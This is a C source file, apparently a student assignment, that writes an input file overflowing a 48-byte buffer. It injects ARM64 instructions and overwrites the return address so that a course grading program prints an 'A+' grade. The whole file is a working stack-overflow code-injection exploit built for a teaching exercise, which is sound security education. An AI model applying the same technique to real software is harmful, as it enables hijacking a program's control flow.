/*--------------------------------------------------------------------*/
/* createdataAplus.c                                                  */
/* Author: Derek Geng and Emily Luo                                   */
/*--------------------------------------------------------------------*/
#include <stdio.h>
#include "miniassembler.h"

enum {MAX_BYTES = 48, GRADE = 0x420044, PRINT_ADR = 0x400874,
      INSTR_SIZE = 34};

/*  Creates a buffer overrun file that sets grade to 'A+'. 
    Writes name out to file dataAplus.
    Returns 0 if successful. */

int main(void) {
    int bytes = 0;
    unsigned long strAdd = 0x420058;
    unsigned long startAdd = 0x420058;
    unsigned int ulInst;
    FILE * fp = fopen("dataAplus", "w");

    /* write name to dataAplus */
    fputs("Derek Geng",fp);
    bytes+=10;

    /* write null terminating str and offset strAdd */
    fputc('\0', fp);
    bytes++;
    strAdd += bytes;

    /* write new str to buffer and add offset to startAdd */
    fputs("A+ is your grade.%c", fp);
    fputc('\0', fp);
    bytes += 20;
    startAdd += bytes;

    /* write until starting address is multiple of 4 */
    while (startAdd % 4 != 0) {
        fputc(0, fp);
        bytes++;
        startAdd++;
    }

    /* store strAdd into x0 */
    ulInst = MiniAssembler_adr(0, strAdd, startAdd);
    fwrite(&ulInst, sizeof(unsigned int), 1, fp);
    bytes += 4;

    /* move '\n' into in w1 */
    ulInst = MiniAssembler_mov(1, '\n');
    fwrite(&ulInst, sizeof(unsigned int), 1, fp);
    bytes += 4;

    /* branch to the grade printf */
    ulInst = MiniAssembler_b(PRINT_ADR, startAdd + 8);
    fwrite(&ulInst, sizeof(unsigned int), 1, fp);
    bytes += 4;

    /* write the rest of the buffer */
    while (bytes < MAX_BYTES){
        fputc(0, fp);
        bytes++;
    }
    
    /* write new return address to overrun instructions in name */
    fwrite(&startAdd, sizeof(unsigned long), 1, fp);

    /* write EOF */
    fputc(EOF, fp);
    fclose(fp);
    return 0;
}